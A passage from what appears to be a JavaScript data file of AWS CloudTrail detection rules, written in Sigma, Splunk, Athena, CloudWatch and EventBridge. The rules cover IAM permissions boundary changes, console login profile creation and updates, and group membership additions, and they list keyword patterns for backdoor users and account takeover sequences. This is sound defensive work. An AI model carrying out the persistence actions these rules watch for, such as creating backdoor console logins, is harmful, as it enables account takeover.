sensitive_use AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('AssumeRole', 'CreatePolicyVersion', 'SetDefaultPolicyVersion', 'PassRole', 'GetSecretValue', 'Decrypt')
)
SELECT b.actor, b.change_time, s.use_time, s.eventName
FROM boundary_change b
JOIN sensitive_use s ON b.actor = s.actor
  AND s.use_time > b.change_time
  AND s.use_time <= b.change_time + INTERVAL '15' MINUTE
ORDER BY b.change_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource
| filter (eventSource = "iam.amazonaws.com" and eventName in ["PutRolePermissionsBoundary", "PutUserPermissionsBoundary"])
  or eventName in ["AssumeRole", "CreatePolicyVersion", "SetDefaultPolicyVersion", "PassRole", "GetSecretValue", "Decrypt"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["PutRolePermissionsBoundary", "PutUserPermissionsBoundary"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.userName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "PutRolePermissionsBoundary", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "TargetRole", permissionsBoundary: "arn:aws:iam::aws:policy/ExampleBoundary" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor that changed the boundary.", "Review the sequence: boundary change → privileged or sensitive action within 15 minutes.", "Verify if the follow-on activity was expected.", "Assess whether the boundary change enabled broader access."],
    testingSteps: ["Call PutRolePermissionsBoundary, then within 15 min call AssumeRole or GetSecretValue.", "Verify both events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },

  // --- IAM Create Login Profile ---
  {
    id: "det-048",
    title: "IAM Login Profile Created",
    description: "Baseline visibility when a console password is created for an IAM user. Use High severity if the platform assumes modern AWS environments should rarely create IAM console passwords; otherwise Medium.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Login Profile", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate onboarding of new IAM users with console access", "Migration from SSO to IAM users"],
    rules: {
      sigma: `title: IAM Login Profile Created
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: CreateLoginProfile
  condition: selection
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=CreateLoginProfile
| table _time, userIdentity.arn, eventName, requestParameters.userName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'CreateLoginProfile'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.userName, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "CreateLoginProfile"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateLoginProfile"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateLoginProfile", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { userName: "backdoor-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who created the login profile.", "Verify if the target user should have console access.", "Check if the environment prefers SSO over IAM console passwords."],
    testingSteps: ["Call CreateLoginProfile for a test user.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-049",
    title: "Login Profile Created by Unexpected Actor",
    description: "Detects console-password creation by actors who normally should not manage IAM users. Suspicious actors include IAM users, application roles, EC2 instance roles, and non-IAM-admin assumed roles. Excludes Terraform, CloudFormation, and admin roles.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Login Profile", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DevOps or helpdesk roles", "IAM admin users with expected access"],
    rules: {
      sigma: `title: Login Profile Created by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: CreateLoginProfile
  filter_known_admin:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'IAMAdmin'
  condition: selection and not filter_known_admin
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=CreateLoginProfile
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%IAMAdmin%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'CreateLoginProfile'
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%IAMAdmin%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "CreateLoginProfile"
| filter userIdentity.principalId not like /terraform/ and userIdentity.principalId not like /cloudformation/ and userIdentity.arn not like /admin/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateLoginProfile"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateLoginProfile", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/app-role/i-xxx" }, requestParameters: { userName: "backdoor-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized to create IAM login profiles.", "Check sessionContext.sessionIssuer.arn for assumed roles."],
    testingSteps: ["As a non-admin role, call CreateLoginProfile.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },
  {
    id: "det-050",
    title: "Login Profile Created for Suspicious or Non-Human User",
    description: "Detects login profile creation for users that look like service accounts, automation users, backdoor users, or identities that historically should not have console access. Attackers may create a console password for a backdoor IAM user or for a user that previously had only API-based access.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Login Profile", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate service account given console access for troubleshooting"],
    rules: {
      sigma: `title: Login Profile Created for Suspicious or Non-Human User
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: CreateLoginProfile
  filter_target:
    requestParameters.userName|contains:
      - 'svc-'
      - 'service'
      - 'automation'
      - 'backdoor'
      - 'bot'
      - 'api'
      - 'cicd'
      - 'terraform'
  condition: selection and filter_target
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=CreateLoginProfile
| where like(requestParameters.userName, "%svc-%") OR like(requestParameters.userName, "%service%") OR like(requestParameters.userName, "%automation%") OR like(requestParameters.userName, "%backdoor%") OR like(requestParameters.userName, "%bot%") OR like(requestParameters.userName, "%api%") OR like(requestParameters.userName, "%cicd%") OR like(requestParameters.userName, "%terraform%")
| table _time, userIdentity.arn, eventName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.userName
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'CreateLoginProfile'
  AND (requestParameters.userName LIKE '%svc-%' OR requestParameters.userName LIKE '%service%' OR requestParameters.userName LIKE '%automation%' OR requestParameters.userName LIKE '%backdoor%' OR requestParameters.userName LIKE '%bot%' OR requestParameters.userName LIKE '%api%' OR requestParameters.userName LIKE '%cicd%' OR requestParameters.userName LIKE '%terraform%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "CreateLoginProfile"
| filter requestParameters.userName like /svc-|service|automation|backdoor|bot|api|cicd|terraform/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateLoginProfile"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateLoginProfile", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { userName: "backdoor-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the target user and whether it is a service or automation account.", "Verify if the user should have console access.", "Check if the user was recently created."],
    testingSteps: ["Create a login profile for a user with 'svc-' in the name.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-051",
    title: "CreateLoginProfile Followed by Console Login",
    description: "High-confidence correlation for persistence or account takeover. CreateLoginProfile for user X followed by ConsoleLogin success for the same IAM user within 24 hours. Escalate if login succeeds without MFA or from unusual source IP.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Critical",
    tags: ["IAM", "Login Profile", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate onboarding followed by user's first console login"],
    rules: {
      sigma: `title: CreateLoginProfile Followed by Console Login
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_create:
    eventSource: iam.amazonaws.com
    eventName: CreateLoginProfile
  selection_login:
    eventSource: signin.amazonaws.com
    eventName: ConsoleLogin
  condition: 1 of selection_*
level: critical
# Full correlation (same user, within 24h) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=iam.amazonaws.com AND eventName=CreateLoginProfile) OR (eventSource=signin.amazonaws.com AND eventName=ConsoleLogin))
| eval target_user=case(eventName="CreateLoginProfile", requestParameters.userName, eventName="ConsoleLogin", replace(userIdentity.arn, ".*user/", ""), 1=1, null)
| eval is_create=if(eventName="CreateLoginProfile", 1, 0)
| eval is_login=if(eventName="ConsoleLogin" AND responseElements.ConsoleLogin="Success", 1, 0)
| transaction target_user maxspan=24h
| where mvcount(mvfilter(is_create=1))>0 AND mvcount(mvfilter(is_login=1))>0
| table _time, target_user, eventName, userIdentity.arn, sourceIPAddress`,
      cloudtrail: `WITH profile_created AS (
  SELECT requestParameters.userName AS target_user, eventTime AS create_time
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName = 'CreateLoginProfile'
),
console_login AS (
  SELECT regexp_extract(userIdentity.arn, 'user/([^/]+)$', 1) AS target_user, eventTime AS login_time
  FROM cloudtrail_logs
  WHERE eventSource = 'signin.amazonaws.com'
    AND eventName = 'ConsoleLogin'
    AND responseElements.ConsoleLogin = 'Success'
)
SELECT p.target_user, p.create_time, c.login_time
FROM profile_created p
JOIN console_login c ON p.target_user = c.target_user
  AND c.login_time > p.create_time
  AND c.login_time <= p.create_time + INTERVAL '24' HOUR
ORDER BY p.create_time DESC`,
      cloudwatch: `fields @timestamp, eventSource, eventName, requestParameters.userName, userIdentity.arn, responseElements.ConsoleLogin
| filter (eventSource = "iam.amazonaws.com" and eventName = "CreateLoginProfile")
  or (eventSource = "signin.amazonaws.com" and eventName = "ConsoleLogin" and responseElements.ConsoleLogin = "Success")
| parse userIdentity.arn "*user/%{target_user}"
| eval target_user=if(eventName="CreateLoginProfile", requestParameters.userName, target_user)
| stats count(*) as cnt, collect_list(eventName) as events by target_user
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateLoginProfile"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.userName", "requestParameters.userName", "responseElements.ConsoleLogin", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateLoginProfile", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { userName: "backdoor-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the user that received the login profile.", "Review ConsoleLogin events for that user within 24 hours.", "Check if the login was from an unusual IP or without MFA."],
    testingSteps: ["Create a login profile, then log in via console within 24h.", "Verify both events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },

  // --- IAM Update Login Profile ---
  {
    id: "det-052",
    title: "IAM Login Profile Updated",
    description: "Baseline visibility when an IAM user's console password is changed. Password changes can be legitimate, especially in support workflows or account recovery.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Medium",
    tags: ["IAM", "Login Profile", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate password reset", "User-initiated password change", "Helpdesk password reset"],
    rules: {
      sigma: `title: IAM Login Profile Updated
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: UpdateLoginProfile
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=UpdateLoginProfile
| table _time, userIdentity.arn, eventName, requestParameters.userName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'UpdateLoginProfile'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.userName, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "UpdateLoginProfile"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["UpdateLoginProfile"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "UpdateLoginProfile", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { userName: "TargetUser" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who updated the login profile.", "Verify if the password change was authorized.", "Check if the target user was recently compromised."],
    testingSteps: ["Call UpdateLoginProfile for a test user.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-053",
    title: "Login Profile Updated by Unexpected Actor",
    description: "Detects password changes made by identities that normally should not manage IAM users. Suspicious actors include IAM users, application roles, EC2 roles, and non-admin assumed roles. Excludes expected admin/helpdesk/automation roles.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Login Profile", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate helpdesk or automation roles", "IAM admin users with expected access"],
    rules: {
      sigma: `title: Login Profile Updated by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: UpdateLoginProfile
  filter_known_admin:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'IAMAdmin'
      - 'helpdesk'
  condition: selection and not filter_known_admin
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=UpdateLoginProfile
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%IAMAdmin%") OR like(userIdentity.arn, "%helpdesk%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'UpdateLoginProfile'
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%IAMAdmin%'
  AND userIdentity.arn NOT LIKE '%helpdesk%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "UpdateLoginProfile"
| filter userIdentity.principalId not like /terraform|cloudformation|admin|helpdesk/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["UpdateLoginProfile"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "UpdateLoginProfile", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/app-role/i-xxx" }, requestParameters: { userName: "TargetUser" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized to update IAM login profiles.", "Check sessionContext.sessionIssuer.arn for assumed roles."],
    testingSteps: ["As a non-admin role, call UpdateLoginProfile.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },
  {
    id: "det-054",
    title: "Login Profile Updated for Sensitive or Suspicious User",
    description: "Detects when a password is changed for privileged IAM users, break-glass users, dormant users, suspected backdoor users, or users not expected to use console access. Attackers often reset passwords on useful identities, not random ones.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Login Profile", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate password rotation for privileged users", "Break-glass procedure"],
    rules: {
      sigma: `title: Login Profile Updated for Sensitive or Suspicious User
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: UpdateLoginProfile
  filter_sensitive:
    requestParameters.userName|contains:
      - 'admin'
      - 'Admin'
      - 'break-glass'
      - 'root'
      - 'backdoor'
      - 'privileged'
  condition: selection and filter_sensitive
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=UpdateLoginProfile
| where like(requestParameters.userName, "%admin%") OR like(requestParameters.userName, "%Admin%") OR like(requestParameters.userName, "%break-glass%") OR like(requestParameters.userName, "%root%") OR like(requestParameters.userName, "%backdoor%") OR like(requestParameters.userName, "%privileged%")
| table _time, userIdentity.arn, eventName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.userName
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'UpdateLoginProfile'
  AND (requestParameters.userName LIKE '%admin%' OR requestParameters.userName LIKE '%Admin%' OR requestParameters.userName LIKE '%break-glass%' OR requestParameters.userName LIKE '%root%' OR requestParameters.userName LIKE '%backdoor%' OR requestParameters.userName LIKE '%privileged%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "UpdateLoginProfile"
| filter requestParameters.userName like /admin|break-glass|root|backdoor|privileged/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["UpdateLoginProfile"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "UpdateLoginProfile", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { userName: "admin-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the target user and whether it is sensitive.", "Verify if the password change was authorized.", "Check if the user was recently involved in an incident."],
    testingSteps: ["Update a login profile for a user with 'admin' in the name.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-055",
    title: "UpdateLoginProfile Followed by Console Login",
    description: "High-confidence persistence or account takeover rule. UpdateLoginProfile for user X followed by successful ConsoleLogin by same user X shortly afterward. Escalate if login succeeds without MFA or from unusual source IP.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Critical",
    tags: ["IAM", "Login Profile", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate password reset followed by user login"],
    rules: {
      sigma: `title: UpdateLoginProfile Followed by Console Login
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_update:
    eventSource: iam.amazonaws.com
    eventName: UpdateLoginProfile
  selection_login:
    eventSource: signin.amazonaws.com
    eventName: ConsoleLogin
  condition: 1 of selection_*
level: critical
# Full correlation (same user, short window) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=iam.amazonaws.com AND eventName=UpdateLoginProfile) OR (eventSource=signin.amazonaws.com AND eventName=ConsoleLogin))
| eval target_user=case(eventName="UpdateLoginProfile", requestParameters.userName, eventName="ConsoleLogin", replace(userIdentity.arn, ".*user/", ""), 1=1, null)
| eval is_update=if(eventName="UpdateLoginProfile", 1, 0)
| eval is_login=if(eventName="ConsoleLogin" AND responseElements.ConsoleLogin="Success", 1, 0)
| transaction target_user maxspan=1h
| where mvcount(mvfilter(is_update=1))>0 AND mvcount(mvfilter(is_login=1))>0
| table _time, target_user, eventName, userIdentity.arn, sourceIPAddress`,
      cloudtrail: `WITH profile_updated AS (
  SELECT requestParameters.userName AS target_user, eventTime AS update_time
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName = 'UpdateLoginProfile'
),
console_login AS (
  SELECT regexp_extract(userIdentity.arn, 'user/([^/]+)$', 1) AS target_user, eventTime AS login_time
  FROM cloudtrail_logs
  WHERE eventSource = 'signin.amazonaws.com'
    AND eventName = 'ConsoleLogin'
    AND responseElements.ConsoleLogin = 'Success'
)
SELECT p.target_user, p.update_time, c.login_time
FROM profile_updated p
JOIN console_login c ON p.target_user = c.target_user
  AND c.login_time > p.update_time
  AND c.login_time <= p.update_time + INTERVAL '1' HOUR
ORDER BY p.update_time DESC`,
      cloudwatch: `fields @timestamp, eventSource, eventName, requestParameters.userName, userIdentity.arn, responseElements.ConsoleLogin
| filter (eventSource = "iam.amazonaws.com" and eventName = "UpdateLoginProfile")
  or (eventSource = "signin.amazonaws.com" and eventName = "ConsoleLogin" and responseElements.ConsoleLogin = "Success")
| parse userIdentity.arn "*user/%{target_user}"
| eval target_user=if(eventName="UpdateLoginProfile", requestParameters.userName, target_user)
| stats count(*) as cnt, collect_list(eventName) as events by target_user
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["UpdateLoginProfile"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.userName", "responseElements.ConsoleLogin", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "UpdateLoginProfile", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { userName: "TargetUser" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the user whose password was updated.", "Review ConsoleLogin events for that user within 1 hour.", "Check if the login was from an unusual IP or without MFA."],
    testingSteps: ["Update a login profile, then log in via console within 1h.", "Verify both events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },

  // --- IAM Add User to Group ---
  {
    id: "det-056",
    title: "IAM User Added to Group",
    description: "Baseline visibility whenever a user is added to an IAM group. Important group-membership activity but can be legitimate in onboarding or admin workflows.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Medium",
    tags: ["IAM", "AddUserToGroup", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate onboarding", "Admin group membership management"],
    rules: {
      sigma: `title: IAM User Added to Group
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: AddUserToGroup
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=AddUserToGroup
| table _time, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'AddUserToGroup'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.groupName, requestParameters.userName, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "AddUserToGroup"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["AddUserToGroup"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.groupName", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "AddUserToGroup", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { groupName: "AdminGroup", userName: "compromised-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who added the user and which group.", "Verify if the group has privileged policies.", "Check if the addition was authorized."],
    testingSteps: ["Call AddUserToGroup.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-057",
    title: "User Added to Privileged Group",
    description: "Detects likely privilege escalation when the destination group is high-risk. Matches Admin, Administrators, PowerUser, BreakGlass, SecurityAdmin, PlatformAdmin patterns.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "AddUserToGroup", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Approved identity-lifecycle or onboarding automation"],
    rules: {
      sigma: `title: User Added to Privileged Group
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: AddUserToGroup
  filter_privileged:
